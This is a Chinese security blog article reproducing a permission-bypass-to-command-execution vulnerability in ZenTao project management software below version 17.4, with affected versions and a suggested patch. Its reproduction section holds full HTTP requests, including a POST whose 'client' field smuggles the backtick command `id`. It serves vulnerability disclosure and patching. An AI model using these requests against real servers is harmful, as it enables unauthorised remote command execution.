---
title: 禅道系统权限绕过与命令执行漏洞
url: https://www.secpulse.com/archives/195828.html
source: 安全脉搏
date: 2023-02-15
fetch_date: 2025-10-04T06:34:58.419601
---

# 禅道系统权限绕过与命令执行漏洞

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 禅道系统权限绕过与命令执行漏洞

[漏洞复现](https://www.secpulse.com/archives/category/articles/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[Timeline Sec](https://www.secpulse.com/newpage/author?author_id=33593)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-02-14

12,761

**上方蓝色字体关注我们，一起学安全！**

**作者：****Jackey****0@Timeline Sec**

**本文字数：1107**

**阅读时长：2～3min**

**声明：仅供学习参考使用，请勿用作违法用途，否则后果自负**

**0x01 简介**

禅道是第一款国产的开源项目管理软件，它的核心管理思想基于敏捷方法scrum，内置了产品管理和项目管理，同时又根据国内研发现状补充了测试管理、计划管理、发布管理、文档管理、事务管理等功能，在一个软件中就可以将软件研发中的需求、任务、bug、用例、计划、发布等要素有序的跟踪管理起来，完整地覆盖了项目管理的核心流程。

**0x02 漏洞概述**

禅道17.4以下版本存在权限绕过到命令执行漏洞。该漏洞是由于禅道项目管理系统权限认证存在缺陷导致，攻击者可利用该漏洞在未授权的情况下，通过权限绕过在服务器执行任意命令。

**0x03 影响版本**

|  |  |
| --- | --- |
| 企业版 | 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2 |
| 开源版 | 17.4以下的未知版本<=version<=18.0.beta1 |
| 旗舰版 | 3.4以下的未知版本<=version<=4.0.beta1 |

**0x04 环境搭建**

选择漏洞版本安装：
https://www.zentao.net/download/zentaopms18.0.beta1-81862.html

安装文档：
https://www.zentao.net/book/zentaopmshelp/40.html

**0x05 漏洞复现**

1.首先依次发送如下两个请求，激活cookie信息：

```
GET /misc-captcha-user.html HTTP/1.1Host: ******Accept-Language: zh-CN,zh;q=0.9Accept-Encoding: gzip, deflateAccept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Connection: keep-aliveCookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=default

POST /repo-create.html HTTP/1.1Host: ******Content-Length: 113Accept-Language: zh-CN,zh;q=0.9Accept-Encoding: gzip, deflateReferer: http://******//repo-edit-1-0.htmlAccept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Connection: keep-aliveX-Requested-With: XMLHttpRequestCookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=defaultContent-Type: application/x-www-form-urlencoded
product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=
```

2.发送如下请求，如果存在漏洞，则返回包中会包含命令执行的结果

```
POST /repo-edit-10000-10000.html HTTP/1.1Host: ******Content-Length: 26Accept-Language: zh-CN,zh;q=0.9Accept-Encoding: gzip, deflateReferer: http://******//repo-edit-1-0.htmlAccept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Connection: keep-aliveX-Requested-With: XMLHttpRequestCookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=defaultContent-Type: application/x-www-form-urlencoded
SCM=Subversion&client=`id`
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195828-1676353612.png)

**0x06 修复方式**

目前禅道官方已正式发布修复版本，建议受影响用户尽快升级至安全版本。

如不能升级，可在module/common/model.php文件中的echo $endResponseException->getContent();后面加上exit(); 来修复权限绕过漏洞。

```
参考链接：
```

https://github.com/webraybtl/zentaopms\_poc

https://mp.weixin.qq.com/s/ZHsYaU31WkzAJijy1V0U1w

**本文作者：[Timeline Sec](newpage/author?author_id=33593)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/195828.html**](https://www.secpulse.com/archives/195828.html)

Tags: [Scrum](https://www.secpulse.com/archives/tag/scrum)、[事务管理](https://www.secpulse.com/archives/tag/%E4%BA%8B%E5%8A%A1%E7%AE%A1%E7%90%86)、[产品管理](https://www.secpulse.com/archives/tag/%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86)、[发布管理](https://www.secpulse.com/archives/tag/%E5%8F%91%E5%B8%83%E7%AE%A1%E7%90%86)、[命令执行漏洞](https://www.secpulse.com/archives/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)、[开源项目管理软件](https://www.secpulse.com/archives/tag/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6)、[敏捷方法](https://www.secpulse.com/archives/tag/%E6%95%8F%E6%8D%B7%E6%96%B9%E6%B3%95)、[文档管理](https://www.secpulse.com/archives/tag/%E6%96%87%E6%A1%A3%E7%AE%A1%E7%90%86)、[测试管理](https://www.secpulse.com/archives/tag/%E6%B5%8B%E8%AF%95%E7%AE%A1%E7%90%86)、[禅道](https://www.secpulse.com/archives/tag/%E7%A6%85%E9%81%93)、[绕过](https://www.secpulse.com/archives/tag/%E7%BB%95%E8%BF%87)、[计划管理](https://www.secpulse.com/archives/tag/%E8%AE%A1%E5%88%92%E7%AE%A1%E7%90%86)、[项目管理](https://www.secpulse.com/archives/tag/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![【HackTheBox】攻克靶机实战interdimensional internet攻略分享](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1684393312004-300x222.png)

  【HackTheBox】攻克靶机实战in…](https://www.secpulse.com/archives/200516.html "详细阅读 【HackTheBox】攻克靶机实战interdimensional internet攻略分享")
* [![阿里云WAF3.0命令执行Bypass，也是WAF的通病](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/1682056021456-300x151.png)

  阿里云WAF3.0命令执行Bypass，…](https://www.secpulse.com/archives/199318.html "详细阅读 阿里云WAF3.0命令执行Bypass，也是WAF的通病")
* [![头疼的上传绕过waf](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198782-1681113810-300x132.png)

  头疼的上传绕过waf](https://www.secpulse.com/archives/198782.html "详细阅读 头疼的上传绕过waf")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/33c1a5edd001f137921cdd6bfef8ccdb-150x150.png)](https://www.secpulse.com/newpage/author?author_id=33593aaa) | [Timeline Sec ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](https://www.secpulse.com/newpage/author?author_id=33593) | |
| 文章数：38 | 积分： 190 |
| 欢迎关注公众号Timeline Sec | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https:...